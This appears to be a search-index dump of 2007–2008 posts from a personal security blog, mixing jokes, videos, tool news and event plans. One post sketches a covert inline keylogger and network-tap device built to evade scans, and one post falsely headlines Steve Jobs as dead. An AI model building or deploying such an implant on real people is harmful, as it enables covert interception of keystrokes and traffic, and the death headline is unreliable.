really fast, or I just didn’t know where to click, but I have been corrected. You can undock the IM interfcae by clicking on the shiloutte and clicking “Pop Out Chat”. This will create a new window and put all of your chatting in the new window. After you are done being pop’ed out, just click Pop-In on the upper right and you are back to normal. While this isn’t the 100% solution I was looking for (Ajax floating chat boxes that could be together or seperate or tabbed) ","date":"2008-04-23","objectID":"https://malicious.link/posts/2008/2008423facebook-chat-all-that-and-a-bag-of-cheesy-poofs-html/:0:0","tags":["Rant"],"title":"Facebook chat - All that and a bag of cheesy poofs","uri":"https://malicious.link/posts/2008/2008423facebook-chat-all-that-and-a-bag-of-cheesy-poofs-html/"},{"categories":null,"content":" Programmers vs. Management Posted on April 17th, 2008 by Carolyn Shelby Received from my mom today, via email. A man in a hot air balloon realized he was lost. He reduced altitude and spotted a woman below. He descended a bit more and shouted, Excuse me, can you help me? I promised a friend I would meet him an hour ago, but I don’t know where I am. The woman below replied, You’re in a hot air balloon hovering approximately 30 feet above the ground. You’re between 40 and 41 degrees north latitude and between 59 and 60 degrees west longitude.� You must be a programmer, said the balloonist. I am,� replied the woman, How did you know? Well,� answered the balloonist, everything you told me is technically correct, but I’ve no idea what to make of your information, and the fact is I’m still lost. Frankly, you’ve not been much help at all. If anything, you’ve delayed my trip.� The woman below responded, You must be in Management.� I am,� replied the balloonist, but how did you know?� Well,� said the woman, you don’t know where you are or where you’re going. You have risen to where you are due to a large quantity of hot air. You made a promise, which you’ve no idea how to keep, and you expect people beneath you to solve your problems. The fact is you are in exactly the same position you were in before we met, but now, somehow, it’s my fault.� Programmers vs. Management | Cshel SEO and PR ","date":"2008-04-20","objectID":"https://malicious.link/posts/2008/2008420the-truth-about-hot-air-baloons-html/:0:0","tags":["Funny"],"title":"The truth about hot air baloons","uri":"https://malicious.link/posts/2008/2008420the-truth-about-hot-air-baloons-html/"},{"categories":null,"content":"So, this is the second time I am writing this article, which really takes writers block to a whole new level. It sucks to loose all of your writing a one fatal click. But enough of my belly aching. http://www.phrack.org Phrack Issue #65 is out, as of April 11th, 2008. I am by no means a Phrack addict or aficionado on all things Phrack, and I have only read TCLH’s introduction which in my humble opinion it is close to Mentor worthy. He makes a point to say that hacking is supposed to be fun, and the responsibilities that are impacted from hacking activities need to be offset by that fun. I whole heartedly agree on that point. While the word ‘poser’ is / was over used, like many words in the English language, to the point of meaninglessness, it exactly describes those who don’t have fun. They do it for the recognition. To see their name on a paper that is passed around, or to huddled around after a conference talk. So, have fun, or leave. We don’t want you. As for the rest of you, enjoy. EDIT: My preview of Maltego v2 has been delayed due to real life obligations. I apologize to those I had promised it to, and mostly to it’s creator, Roelof Temmingh Book Suggestion: The Cuckoo’s Egg: Tracking a Spy Through the Maze of Computer Espionage Technorati Tags: hacking, maltego, paterva, phrack, hacker ","date":"2008-04-16","objectID":"https://malicious.link/posts/2008/2008416phrack-is-back-again-html/:0:0","tags":["Uncategorized"],"title":"Phrack is back! Again.","uri":"https://malicious.link/posts/2008/2008416phrack-is-back-again-html/"},{"categories":null,"content":"Check out http://www.hak5.org/stickers to help Hak.5 pay for their 4th Season of Technolust. ","date":"2008-04-15","objectID":"https://malicious.link/posts/2008/2008415help-hak5-buy-some-ramen-html/:0:0","tags":["Uncategorized"],"title":"Help Hak.5 buy some ramen!","uri":"https://malicious.link/posts/2008/2008415help-hak5-buy-some-ramen-html/"},{"categories":null,"content":"[youtube=http://www.youtube.com/watch?v=3AdFA6WWJ7E\u0026w;=425\u0026h;=355] ","date":"2008-04-15","objectID":"https://malicious.link/posts/2008/2008415muppets-roll-80s-html/:0:0","tags":["Funny"],"title":"Muppets roll 80s","uri":"https://malicious.link/posts/2008/2008415muppets-roll-80s-html/"},{"categories":null,"content":"Red Skelton was a good \u0026 funny man. He also ended every show by saying, ‘GOOD NIGHT AND GOD BLESS.’ Listen to the end of this. It is something he said 39 years ago. Youtube Link: Red Skelton’s Pledge of Allegiance You can also help others find it by digging the story ","date":"2008-04-13","objectID":"https://malicious.link/posts/2008/2008413red-skeltons-pledge-of-allegiance-html/:0:0","tags":["Uncategorized"],"title":"Red Skelton's Pledge of Allegiance","uri":"https://malicious.link/posts/2008/2008413red-skeltons-pledge-of-allegiance-html/"},{"categories":null,"content":" So, a while back I wrote about a program called “Evolution”. Since then it has evolved into its new form “Maltego”. Maltego has had it’s face ripped off and remolded, and lot of work on the back end, if you know what I mean. So basically I was teased by the creator of Maltego. He sent me these two images showing the awesomeness that will be Maltego v2 (and yes, Awesomeness is a word) But I have been promised that a beta copy of v2 should be hitting my inbox in the next couple of weeks. So, as soon as I have pushed the new Awesomeness to the limits I will post right here on what ya’ll can expect out of a product that already was blowing minds back and forth across the Security / Intel field. ","date":"2008-04-01","objectID":"https://malicious.link/posts/2008/200841not-an-april-fools-joke-html/:0:0","tags":["Uncategorized"],"title":"NOT an April Fools joke","uri":"https://malicious.link/posts/2008/200841not-an-april-fools-joke-html/"},{"categories":null,"content":"I just wanted to do my part and tip my hat to Johnny Long from ihackstuff.com. He really is doing great work. Also, check out hackersforcharity.org to do your part. Without further ado, HERE’S JOHNNY! No Tech Hacking Released! I’m proud to announce the release of No Tech Hacking from Syngress Publishing! I’m even more happy to announce that 100% of the proceeds will be going to charity. In fact, each purchase through this Amazon like will feed an African child for one month! What’s the story with the proceeds? It’s simple, really. My proceeds from this book are going to AOET (aoet.org), an organization that provides food, education and medical care to children left in the wake of Africa’s HIV/AIDS epidemic. More than an aid organization, AOET aims to disrupt the cycle of poverty and hopelessness in sub-Saharan Africa through empowerment programs and job training, enabling children and adults to be self-sustaining, restoring not only their health but their pride and hope for a brighter future. A single book purchase made through my Amazon associates account (linked from any of my websites, or though http://tiniuri.com/f/Xpc) will generate enough income for AOET to feed a child for an entire month. Other retail purchases (which generate half as much income) will provide either medical services or educational supplies and funding for a single child through a donation pool set aside for those purposes. Why bother? Because I am called to “look after orphans and widows in their distress” (James 1:27), and I know from personal experience how mutually transformative it can be to take that calling seriously. Hamlet was onto something when he wondered, “Whether ’tis nobler in the mind to suffer the slings and arrows of outrageous fortune or to take arms against a sea of troubles, and by opposing, end them.” – Johnny Long So if you can’t do anything else, buy a book using the link above and help support a child in need. Again, the link is: No Tech Hacking on Amazon.com - http://tinyurl.com/3bt9or ","date":"2008-03-16","objectID":"https://malicious.link/posts/2008/no-tech-hacking-tip-of-the-hat/:0:0","tags":["guestpost","johnnylong","hackersforcharity"],"title":"No Tech Hacking - Tip of the Hat","uri":"https://malicious.link/posts/2008/no-tech-hacking-tip-of-the-hat/"},{"categories":null,"content":"I’ve had an idea and I have been hashing it out the last couple days. I want a smal piece of hardware that runs basically a MITM, but a physical one. Something like those old keyloggers that you plug between a PS/2 keyboard and a computer. If it already exsists, please link me, but this is what I want it to do: Features of the KVM-MITM: Ports: (2) DVI or VGA; (2) Ethernet NICs; (4) USB or/and (4) PS/2 Ports \u003c– Half male, Half female Services: VNC or RDP - a remote way to alter what is happening Keylogger - recording all keys pushed through USB or PS/2 Mouse SSH / SFTP - for reconfiguration or grabbing Keylogger data IP snagger - management of using a static IP address within the DHCP scope automagically, without registering with DHCP SSH Client for Tunneling local services SSL Tunneling client for alternate means of tunneling if port 22 is blocked Iptables - keep from a scan detecting the bridged nic (0 ports open, just tunnels outboud listening) Power Supply: USB powered or a Male/Female plug for a standard desktop power cord Just an idea…. any takers? ","date":"2008-02-06","objectID":"https://malicious.link/posts/2008/kvm-mitm/:0:0","tags":["ideas","rant"],"title":"KVM MITM","uri":"https://malicious.link/posts/2008/kvm-mitm/"},{"categories":null,"content":"This is me complaining that I have too much on my plate. And, it is all my fault that I accepted so much. Here are the projects I currently am working on: Hak.5 Radio - This project has taken on a life of it’s own, the community member run it and are currently working on a site design and back end. I really have to applaud the effort and free time that everyone on the H5rDev team has put into making the only community radio station on the net so sucessful. Check it out at http://www.hak5radio.com Podcasters Meetup - I am happy that this event is having it’s 2nd Annual event at ShmooCon 08. Last year was a lot of fun, however anyone who has ever scheduled an event of a mid to large size, it’s almost a full time job in of it self . You can check out updates at PodcastersMeetup.com. I would suggest just picking up the RSS feed EEEHackers.com - Now, I am by no means the lead on this project but I am a contributing editor, and as any blogger can tell you, finding and creating content on any kind of schedule is also a full time job. Projects that I have less investment in are Paterva’s Maltego (development of transforms), Karma (developing for embeded devices) and keeping this blog up to date. All that, coupled with a full time job, two kids, and my current job search, it is just a bit overwhelming. So, now that I have complained and gotten everything off my chest, please check out the aforementioned projects and if you wish to help out give me a ring or email. ","date":"2008-01-23","objectID":"https://malicious.link/posts/2008/too-busy-to-breath/:0:0","tags":["excuses","rant"],"title":"Too busy to breath","uri":"https://malicious.link/posts/2008/too-busy-to-breath/"},{"categories":null,"content":" Original Source: truckbearingkibble.com/comic/2007/11/08/the-gods-must-be-tasty/ I saw this on stumble a couple weeks ago, and it’s been stored as a draft for that long. Anyways, I think it is one of the most hilarious comics I have seen in a very long time (Exception {Dilbert}). ","date":"2007-12-14","objectID":"https://malicious.link/posts/2007/20071214easter-islands-secret-revealed-html/:0:0","tags":["Funny"],"title":"Easter Island's SECRET REVEALED","uri":"https://malicious.link/posts/2007/20071214easter-islands-secret-revealed-html/"},{"categories":null,"content":"Remote Exploit has released BackTrack 3 Beta. An official announcement is due tomorrow, and until then, the ISO and USB images are available on torrent, and the Hak.5 Community, to include myself has really stepped up and footed some HTTP bandwidth for those less fortunate not to behind P2P block and/or retrictions. I will be writing a piece up on the Beta as soon as I get the same thing that the developers have been craving: SLEEP Check out their wiki here: backtrack.offensive-security.com/index.php/Main_Page And the thread that started it all as well as the links for HTTP downloads: forums.remote-exploit.org/showthread.php read more | digg story ","date":"2007-12-14","objectID":"https://malicious.link/posts/2007/20071214backtrack-3-beta-is-out-html/:0:0","tags":["Uncategorized"],"title":"BackTrack 3 Beta is out!","uri":"https://malicious.link/posts/2007/20071214backtrack-3-beta-is-out-html/"},{"categories":["Rant"],"content":"This is a test of the EMERGENCY SBN, This is only a test. If this was a real security emergency, the FBI would contact you. Thank you for your patience. ","date":"2007-11-16","objectID":"https://malicious.link/posts/2007/20071116this-is-only-a-test-html/:0:0","tags":["Rant"],"title":"This is only a Test","uri":"https://malicious.link/posts/2007/20071116this-is-only-a-test-html/"},{"categories":null,"content":"So, last Shmoocon (2007) was my second year running at the con and we did something that hasn't been done before: A Security/Hacker's Pod/Vidcast meetup at the conference which gave a chance for their listeners/viewers to meet the people behind the mic/camera. Well, a little less than one year later and plans for the next meetup are already underway. And, as I learn the ropes of putting something like this together we will be getting better venues and hopefully down the road meetups will pop up at Defcon and other conferences. Here are the details so far: We will have hosts from: Hak.5, SploitCast, PaulDotCom, Secthis, and others that are getting back to me At the moment we don't have a venue, but I am working on getting space inside the hotel Free Beer and Free Food will be available until the tap runs dry. This depends on the venue, because some places in the hotel are not allowed to have liquor in them. Also in the air is a live broadcast from ShmooCon PODCASTERSMEETUP.COM This is where future updates of meetups can be found. Also, if you want to run a meetup, if you are a podcaster and want to advertise your presence at a meetup, or you simply want to post news about the meetup or conference you can sign up for an account and send me an email telling me what you want to do and I'll get that hooked up for you. If you would like more information about the meetup, or you want to sponsor it please feel free to email me. Thanks, mubix ","date":"2007-11-10","objectID":"https://malicious.link/posts/2007/20071110podcasters-meetup-html/:0:0","tags":["Uncategorized"],"title":"Podcasters Meetup","uri":"https://malicious.link/posts/2007/20071110podcasters-meetup-html/"},{"categories":["Rant"],"content":"Proud member of Security Bloggers Network, a FeedBurner Network. The fools… ","date":"2007-10-31","objectID":"https://malicious.link/posts/2007/20071030they-let-me-in-muhaha-html/:0:0","tags":["Rant"],"title":"They let me in. Muhaha","uri":"https://malicious.link/posts/2007/20071030they-let-me-in-muhaha-html/"},{"categories":["Rant"],"content":"A while ago I said that I was going to start putting more security related articles up. Well, it’s now on the wire. I have applied to join the Security Blogger’s Network. So a lot more people than just the Hak.5 crew are going to possibly be reading this blog. I may or may not be chosen to join the network, but if I do, it should be an wild ride. I encourage all of you out there floating in the cloud to add the feed to your readers and to those security bloggers out there, apply to join. The rush begins. ","date":"2007-10-29","objectID":"https://malicious.link/posts/2007/20071029time-to-shape-up-html/:0:0","tags":["Rant"],"title":"Time to shape up.","uri":"https://malicious.link/posts/2007/20071029time-to-shape-up-html/"},{"categories":["Rant"],"content":"It is not often, especially this day in age, that shakes one to the core. This is one of those times. Original Source: http://www.eightcitiesmap.com/transcript_bc.htm DR BILL COSBY SPEAKS at the 50th Anniversary commemoration of the Brown vs Topeka Board of Education Supreme Court Decision Ladies and gentlemen, I really have to ask you to seriously consider what you’ve heard, and now this is the end of the evening so to speak. I heard a prize fight manager say to his fellow who was losing badly, “David, listen to me. It’s not what’s he’s doing to you. It’s what you’re not doing. (laughter). Ladies and gentlemen, these people set, they opened the doors, they gave us the right, and today, ladies and gentlemen, in our cities and public schools we have fifty percent drop out. In our own neighborhood, we have men in prison. No longer is a person embarrassed because they’re pregnant without a husband. (clapping) No longer is a boy considered an embarrassment if he tries to run away from being the father of the unmarried child (clapping) Ladies and gentlemen, the lower economic and lower middle economic people are [not*] holding their end in this deal. In the neighborhood that most of us grew up in, parenting is not going on. (clapping) In the old days, you couldn’t hooky school because every drawn shade was an eye (laughing). And before your mother got off the bus and to the house, she knew exactly where you had gone, who had gone into the house, and where you got on whatever you had one and where you got it from. Parents don’t know that today. I’m talking about these people who cry when their son is standing there in an orange suit. Where were you when he was two? (clapping) Where were you when he was twelve? (clapping) Where were you when he was eighteen, and how come you don’t know he had a pistol? (clapping) And where is his father, and why don’t you know where he is? And why doesn’t the father show up to talk to this boy? The church is only open on Sunday. And you can’t keep asking Jesus to ask doing things for you (clapping). You can’t keep asking that God will find a way. God is tired of you (clapping and laughing). God was there when they won all those cases. 50 in a row. That’s where God was because these people were doing something. And God said, “I’m going to find a way.” I wasn’t there when God said it… I’m making this up (laughter). But it sounds like what God would do (laughter). We cannot blame white people. White people (clapping) .. white people don’t live over there. They close up the shop early. The Korean ones still don’t know us as well…they stay open 24 hours (laughter). I’m looking and I see a man named Kenneth Clark. He and his wife Mamie…Kenneth’s still alive. I have to apologize to him for these people because Kenneth said it straight. He said you have to strengthen yourselves…and we’ve got to have that black doll. And everybody said it. Julian Bond said it. Dick Gregory said it. All these lawyers said it. And you wouldn’t know that anybody had done a damned thing. 50 percent drop out rate, I’m telling you, and people in jail, and women having children by five, six different men. Under what excuse, I want somebody to love me, and as soon as you have it, you forget to parent. Grandmother, mother, and great grandmother in the same room, raising children, and the child knows nothing about love or respect of any one of the three of them (clapping). All this child knows is “gimme, gimme, gimme.” These people want to buy the friendship of a child….and the child couldn’t care less. Those of us sitting out here who have gone on to some college or whatever we’ve done, we still fear our parents (clapping and laughter). And these people are not parenting. They’re buying things for the kid. $500 sneakers, for what? They won’t buy or spend $250 on Hooked on Phonics. (clapping) AKenneth Clark, somewhere in his home in upstate New York…just looking ahead. Thank God, he doesn’t know what’s going on, thank God. But these pe","date":"2007-10-29","objectID":"https://malicious.link/posts/2007/20071029history-is-mad-html/:0:0","tags":["Rant"],"title":"History is MAD","uri":"https://malicious.link/posts/2007/20071029history-is-mad-html/"},{"categories":null,"content":"Naturally 7 performing in a New York subway. Concert sauvage dans le metro ! Uploaded by lapapsprod ","date":"2007-10-24","objectID":"https://malicious.link/posts/2007/20071024oh-lord-html/:0:0","tags":["Uncategorized"],"title":"Oh Lord!","uri":"https://malicious.link/posts/2007/20071024oh-lord-html/"},{"categories":["Rant"],"content":"I am in training right now and the instructor made a funny, which I will probably be making into a shirt. “I no longer have to work out to impress women. I learned Linux” ","date":"2007-10-10","objectID":"https://malicious.link/posts/2007/20071010because-i-learned-linux-html/:0:0","tags":["Rant"],"title":"because I learned linux","uri":"https://malicious.link/posts/2007/20071010because-i-learned-linux-html/"},{"categories":["Rant"],"content":"George Carlin is funny. Offensive to most everyone, but I think the whole “I hate everyone, so it’s not an ‘ism’ thing” works here. Here he is on the topic of Religion: [youtube http://www.youtube.com/watch?v=MeSSwKffj9o] ","date":"2007-10-09","objectID":"https://malicious.link/posts/2007/2007109george-carlin-does-religion-html/:0:0","tags":["Rant"],"title":"George Carlin does Religion","uri":"https://malicious.link/posts/2007/2007109george-carlin-does-religion-html/"},{"categories":null,"content":"I was a quick fan of the show called “Jericho” on CBS. It was one of the few shows on that didn’t have the advertising that LOST or The 4400 had, but still competed or surpassed in some cases the level of story and all out “Good”. I am lost for words since I’ve posted like 4 posts tonight, so without further ado: ","date":"2007-10-09","objectID":"https://malicious.link/posts/2007/2007109jericho-thanks-the-people-html/:0:0","tags":["Uncategorized"],"title":"Jericho thanks the people","uri":"https://malicious.link/posts/2007/2007109jericho-thanks-the-people-html/"},{"categories":null,"content":"Pay premium dollars for bottled water? Think it tastes better? Do you actually believe that it comes from the places that are printed on the label? Well here are Pen and Teller’s answer to those every questions: [youtube=http://www.youtube.com/watch?v=XfPAjUvvnIc\u0026w;=425\u0026h;=350] ","date":"2007-10-09","objectID":"https://malicious.link/posts/2007/2007109pen-and-teller-bust-bottled-water-html/:0:0","tags":["Uncategorized"],"title":"Pen and Teller bust bottled water.","uri":"https://malicious.link/posts/2007/2007109pen-and-teller-bust-bottled-water-html/"},{"categories":null,"content":"Original Source: http://ubuntu.qio.dk/ubuntu/ I recently stumbled upon a awesome script. Tried and test, works out of the box. Basically you open a terminal, paste this in, and hit enter. sudo -k \u0026\u0026 clear \u0026\u0026 gksudo -D “setup script” echo \u0026\u0026 sudo apt-get update \u0026\u0026 sudo apt-get install -y ubuntu-restricted-extras gstreamer0.10-ffmpeg gstreamer0.10-plugins-bad gstreamer0.10-plugins-bad-multiverse libdvdread3 unrar totem-gstreamer vlc nfs-kernel-server samba gparted \u0026\u0026 gconftool-2 –type boolean –set /apps/nautilus/preferences/always_use_browser false \u0026\u0026 sudo gconftool-2 –direct –config-source xml:readwrite:/etc/gconf/gconf.xml.defaults –type boolean –set /apps/nautilus/preferences/always_use_browser false \u0026\u0026 gconftool-2 –type string –set /desktop/gnome/volume_manager/autoplay_dvd_command “vlc %m” \u0026\u0026 sudo gconftool-2 –direct –config-source xml:readwrite:/etc/gconf/gconf.xml.defaults –type string –set /desktop/gnome/volume_manager/autoplay_dvd_command “vlc %m” \u0026\u0026 sudo /usr/share/doc/libdvdread3/install-css.sh \u0026\u0026 echo -e \\n\\nBxnl, nyy qbar. Lbh pna pybfr guvf jvaqbj abj. \\n | tr ‘[a-m][n-z][A-M][N-Z]’ ‘[n-z][a-m][N-Z][A-M]’ Worked like a charm, codecs, DVD playing, flash, java, just as the original post says. I still suggest Automatix, for the other ‘stuff’ but if you are just looking at Automatix for the aforementioned features, here is a quick and easy solution. ","date":"2007-10-09","objectID":"https://malicious.link/posts/2007/2007108automatix-automated-html/:0:0","tags":["Uncategorized"],"title":"Automatix automated.","uri":"https://malicious.link/posts/2007/2007108automatix-automated-html/"},{"categories":null,"content":"So, this is my first time writing with ScribeFire. (We’ll see if it auto detects it’s name and links to it. But, as you can probably tell by the title, this article isn’t about ScribeFire. It’s about Logmein.com. Now, you most likely have already seen or used this service, and I have fought back in forth in my head about regurgitating information which I think people already know. However, I’ll save that talk for another post. On with it already. Logmein.com is an awesome service and a scary one. As with any useful and powerful tool, it can be used for good or evil. The best way to describe their service is like VNC, or Remote Desktop for you Microsoft people. It’s SSL based so, if you can resolve it, you can probably use it. Where is your business. ;-) They offer a bunch of services, the free one stays free. I use it mainly to help all of the people in my family that need tech support. Here is how it works: Sign up for an account Click the Add Computer Go through the motions (Next, Next, Finish) You’re done. Now the computer will be available to you on a list. There is a dual layer of protection here. You have your account that you log into the web site as, and then the account on the computer that you log in to. So, if for any reason the person that you installed the Logmein client on doesn’t want you to have access, or your Logmein account gets compromised, there is still that second layer of security. In summary, I think it is an awesome service, and if you like it, you should check out some of their paid plans as well. Powered by ScribeFire. ","date":"2007-10-09","objectID":"https://malicious.link/posts/2007/2007108logmeincom-html/:0:0","tags":["Uncategorized"],"title":"Logmein.com","uri":"https://malicious.link/posts/2007/2007108logmeincom-html/"},{"categories":["Rant"],"content":"QUESTIONS ********* Why do you need a driver’s license to buy liquor in America when you can’t drink and drive? Why isn’t phonetic spelled the way it sounds? Why are there interstate highways in Hawaii? Why are there flotation devices under plane seats instead of parachutes? Why are cigarettes sold in gas stations when smoking is prohibited there? Do you need a silencer if you are going to shoot a mime? Have you ever imagined a world with no hypothetical situations? How does the guy who drives the snowplow get to work in the mornings? If 7-11 is open 24 hours a day, 365 days a year, why are there locks on the doors? If a cow laughed, would milk come out her nose? If nothing ever sticks to TEFLON, how do they make TEFLON to stick to the pan? If you tied buttered toast to the back of a cat and dropped it from a height, what would happen? If you’re in a vehicle going the speed of light, what happens when you turn on the headlights? You know how most packages say “Open here”. What is the protocol if the package says, “Open somewhere else”? Why do they put Braille dots on the keypad of the drive-up ATM? Why do Americans drive on parkways and park on driveways? Why is it that when you transport something by car, it’s called a shipment, but when you transport something by ship, it’s called cargo? You know that little indestructible black box that is used on planes, why can’t they make the whole plane out of the same substance? Why is it that when you’re driving and looking for an address, you turn down the volume on the radio? Why does your nose run and your feet smell? Why do American always call for the cheque, and then give one back to the waitress? ","date":"2007-10-08","objectID":"https://malicious.link/posts/2007/2007108questions-that-need-answering-html/:0:0","tags":["Rant"],"title":"Questions that need answering.","uri":"https://malicious.link/posts/2007/2007108questions-that-need-answering-html/"},{"categories":null,"content":"I paid 700 dollars for a piece of paper on eBay one time and didn’t not have the common sense at the time to take it any further than contacting PayPal (which didn’t help). But this mother did. [youtube http://www.youtube.com/watch?v=A12qtprly-Q] ","date":"2007-10-07","objectID":"https://malicious.link/posts/2007/2007107judge-judy-gains-my-respect-html/:0:0","tags":["Uncategorized"],"title":"Judge Judy gains my respect","uri":"https://malicious.link/posts/2007/2007107judge-judy-gains-my-respect-html/"},{"categories":null,"content":"I found this while Stumbleing around. A very interesting look on what the future might bring. [youtube=http://www.youtube.com/watch?v=xj8ZadKgdC0\u0026w;=425\u0026h;=350] ","date":"2007-10-05","objectID":"https://malicious.link/posts/2007/2007105youtube-prophecies-html/:0:0","tags":["Uncategorized"],"title":"Youtube Prophecies","uri":"https://malicious.link/posts/2007/2007105youtube-prophecies-html/"},{"categories":null,"content":"Flunk chemistry? Well here is a step by step how to that will gain the awe of your old chemistry teacher…. And save you money on your electricity bill. read more | digg story ","date":"2007-10-04","objectID":"https://malicious.link/posts/2007/2007104cut-your-electricity-bill-in-half-html/:0:0","tags":["Uncategorized"],"title":"Cut your electricity bill in Half","uri":"https://malicious.link/posts/2007/2007104cut-your-electricity-bill-in-half-html/"},{"categories":null,"content":"An ‘Emperor’ among phones, a release date is set and it’s coming soon. What next? An iPhone Nano? read more | digg story ","date":"2007-09-27","objectID":"https://malicious.link/posts/2007/2007927htc-kaiser-gets-us-release-date-html/:0:0","tags":["Uncategorized"],"title":"HTC Kaiser gets US release date","uri":"https://malicious.link/posts/2007/2007927htc-kaiser-gets-us-release-date-html/"},{"categories":null,"content":"As of submit time there is 94K online and 1.2 million online in the last 24 hours. Pretty cool, huh? read more | digg story ","date":"2007-09-27","objectID":"https://malicious.link/posts/2007/2007927pic-global-halo-3-usage-map-live-as-in-right-now-data-html/:0:0","tags":["Uncategorized"],"title":"(PIC) global Halo 3 usage map - live (as in right now) data","uri":"https://malicious.link/posts/2007/2007927pic-global-halo-3-usage-map-live-as-in-right-now-data-html/"},{"categories":null,"content":"Microsoft employs some of the best hackers in the world and actively recruits them and develops them. They work on all kinds of projects, whether it be in development, research, testing, management and of course security. read more | digg story ","date":"2007-09-03","objectID":"https://malicious.link/posts/2007/200793official-microsoft-hackers-blog-html/:0:0","tags":["Uncategorized"],"title":"Official Microsoft Hackers Blog","uri":"https://malicious.link/posts/2007/200793official-microsoft-hackers-blog-html/"},{"categories":["internet","technocrat"],"content":"What star is right around the corner? read more | digg story ","date":"2007-08-23","objectID":"https://malicious.link/posts/2007/2007-08-23-google-earth-sky-easteregg/:0:0","tags":null,"title":"Google Earth SKY Easteregg","uri":"https://malicious.link/posts/2007/2007-08-23-google-earth-sky-easteregg/"},{"categories":null,"content":"I know this isn't tech related but if you have ever just been frustrated with not winning, this just might give you the edge you need. http://www.blifaloo.com/info/beat-carnival-games.php ","date":"2007-08-22","objectID":"https://malicious.link/posts/2007/2007822how-to-beat-carnival-games-html/:0:0","tags":["Uncategorized"],"title":"How to beat carnival games!","uri":"https://malicious.link/posts/2007/2007822how-to-beat-carnival-games-html/"},{"categories":null,"content":"The legendary BitTorrent site â€œSuprNovaâ€� will return today, courtesy of The Pirate Bay. Not surprisingly, the new and improved SuprNova has a special message to the copyright police: â€œYou are the past and the forgotten, we are the Internet and the futureâ€�.read more | digg story ","date":"2007-08-21","objectID":"https://malicious.link/posts/2007/2007821suprnova-the-legend-returns-today-html/:0:0","tags":["Uncategorized"],"title":"SuprNova: The Legend Returns Today","uri":"https://malicious.link/posts/2007/2007821suprnova-the-legend-returns-today-html/"},{"categories":null,"content":" Image originally posted at: http://www.flickr.com/photos/7950449@N03/1172090604/ ","date":"2007-08-20","objectID":"https://malicious.link/posts/2007/2007820steve-jobs-dead-at-52-html/:0:0","tags":["Uncategorized"],"title":"Steve Jobs dead at 52","uri":"https://malicious.link/posts/2007/2007820steve-jobs-dead-at-52-html/"},{"categories":null,"content":"John Stottlemire is the DVD Jon of coupon-clipping, and it’s getting him in trouble. read more | digg story ","date":"2007-08-20","objectID":"https://malicious.link/posts/2007/2007820coupon-hacker-faces-dmca-lawsuit-html/:0:0","tags":["Uncategorized"],"title":"Coupon Hacker Faces DMCA Lawsuit","uri":"https://malicious.link/posts/2007/2007820coupon-hacker-faces-dmca-lawsuit-html/"},{"categories":null,"content":"Ok, admit it. You have searched for your name in Google, Technorati, or egoSurf.org just to see how you were ranked. You may have even gone to the extent of using RSS feed searches or services such as MonitorThis to keep tabs on your name/handle. Or, you might be a Penetration Tester who is in the “Enumeration / Information Gathering” phase. Or a Security Professional that wants to keep tabs on what kind of fingerprint their company has out there. Any one of these reasons and methods might leave you with information overload, or just not enough information. Well, it’s time to evolve. Paterva has released a product called Evolution. It comes in 3 forms. Web, which is their “classic” version. GUI, which is an installable version that I think is FAR superior. And then they have “Wizard”, which isn’t completed yet. So, when I first heard about this product, I was like “meh, another google search aggregator”. But when I gave it a shot, it floored me. Evolution does relational linking of search results. Now all the Database geeks just peed their pants and the rest of us pretended like we knew what that meant. (I had to google it) What that means is, it automates the process of looking at the search results and finds relationships between them, scoring them on how much a certain item is related to. What does this mean to you? Scarier or more informative results, depends on which side of the coin you are on, Security Pro, Pen Tester, or just another eager ego surfer. My only gripe about the GUI is that it doesn’t run on Vista. But, it is still in the perpetual beta that is the industry standard now ‘n days. read more | digg story ","date":"2007-08-18","objectID":"https://malicious.link/posts/2007/2007818its-time-to-evolve-html/:0:0","tags":["Uncategorized"],"title":"It's time to Evolve","uri":"https://malicious.link/posts/2007/2007818its-time-to-evolve-html/"},{"categories":null,"content":"Skype dies? What happens if you rely on it to do your job, podcast, or radio station? Time to start thinking of backups. read more | digg story ","date":"2007-08-17","objectID":"https://malicious.link/posts/2007/2007817skype-wont-let-me-log-in-html/:0:0","tags":["Uncategorized"],"title":"Skype wont let me log in!","uri":"https://malicious.link/posts/2007/2007817skype-wont-let-me-log-in-html/"},{"categories":null,"content":"Thought it was rather clever. read more | digg story [youtube=http://www.youtube.com/watch?v=LAr3XbqUbjo\u0026w;=425\u0026h;=350] ","date":"2007-08-14","objectID":"https://malicious.link/posts/2007/2007814warning-a-linux-commercial-html/:0:0","tags":["Uncategorized"],"title":"Warning! A Linux Commercial.","uri":"https://malicious.link/posts/2007/2007814warning-a-linux-commercial-html/"},{"categories":null,"content":"You never know where and when you may need to pick a lock. You may just need to get into your house or car, or you may be captured by insurgents in a foreign nation. Whatever the case may be, this is the Beginners Guide To Lock Picking. With practice and time, your skills will improve.read more | digg story ","date":"2007-08-14","objectID":"https://malicious.link/posts/2007/2007814beginners-guide-to-lock-picking-w-pics-html/:0:0","tags":["Uncategorized"],"title":"Beginners Guide To Lock Picking [w /pics]","uri":"https://malicious.link/posts/2007/2007814beginners-guide-to-lock-picking-w-pics-html/"},{"categories":null,"content":"Originally posted at: http://tech.nocr.at/hacking-security/nmap-127-0-0-1-flash-style A design flaw found in ActionScript (Flash) has been allowed the scanning hosts via trial and error. Whenever a port is queried by Flash that isn’t open, it responds with a “SecurityErrotEvent” instantly. But, when a port is open, it doesn’t get that response for an extended period of time, while it waits for a reply to “policy-file-request”. PoC can be viewed at the below address. Now the question is: What ELSE can you do with this information once you have this ability. I’ll leave that up to the color of your hat. http://scan.flashsec.org/ ","date":"2007-08-13","objectID":"https://malicious.link/posts/2007/2007813nmap-127001-flash-style-html/:0:0","tags":["Uncategorized"],"title":"Nmap 127.0.0.1: Flash style","uri":"https://malicious.link/posts/2007/2007813nmap-127001-flash-style-html/"},{"categories":null,"content":"How to save $840 a year by using Internet Connection Sharing instead of the paid service from your cell phone provider on your Windows mobile device. read more | digg story ","date":"2007-08-11","objectID":"https://malicious.link/posts/2007/2007811how-to-avoid-tethered-data-charges-on-your-mobile-device-html/:0:0","tags":["Uncategorized"],"title":"How to avoid tethered data charges on your Mobile device.","uri":"https://malicious.link/posts/2007/2007811how-to-avoid-tethered-data-charges-on-your-mobile-device-html/"},{"categories":null,"content":"I know I am a bit late to the game but here it is: [youtube=http://www.youtube.com/watch?v=nCvmkxO5hoQ\u0026w;=425\u0026h;=350] Also, if you can hear, check out this arstechnica article ","date":"2007-08-10","objectID":"https://malicious.link/posts/2007/2007810nbc-dateline-reporter-flees-defcon-15-html/:0:0","tags":["Uncategorized"],"title":"NBC Dateline Reporter flees Defcon 15","uri":"https://malicious.link/posts/2007/2007810nbc-dateline-reporter-flees-defcon-15-html/"},{"categories":null,"content":"This is a 